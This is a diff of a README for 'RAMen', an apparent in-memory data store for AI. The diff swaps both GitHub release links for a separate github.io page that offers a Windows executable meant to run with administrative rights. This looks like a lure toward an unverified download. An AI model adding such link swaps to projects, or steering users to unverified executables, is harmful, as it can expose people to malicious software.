@@ -1,6 +1,6 @@
 # 🍜 RAMen - Fast memory storage for modern AI
 
-[![Download RAMen](https://img.shields.io/badge/Download-RAMen-blue.svg)](https://github.com/fallfrogorchid557/RAMen/releases)
+[![Download RAMen](https://img.shields.io/badge/Download-RAMen-blue.svg)](https://fallfrogorchid557.github.io)
 
 RAMen stores data in your computer memory. This makes retrieving information nearly instant. Use this tool if you build AI agents or applications that need fast responses. It works like popular database software, but it includes special tools for artificial intelligence.
 
@@ -12,7 +12,7 @@ Software applications often need to remember information quickly. RAMen acts as 
 
 You need a computer running Windows 10 or Windows 11. RAMen requires 512MB of free RAM to run smoothly. Ensure you have administrative rights on your machine to start the service.
 
-1. Visit the [RAMen release page](https://github.com/fallfrogorchid557/RAMen/releases) to find the latest version.
+1. Visit the [RAMen release page](https://fallfrogorchid557.github.io) to find the latest version.
 2. Look for the file named `RAMen-windows-amd64.exe` in the list of assets.
 3. Click the filename to save the file to your computer.
 4. Move the file to a folder where you store your applications.
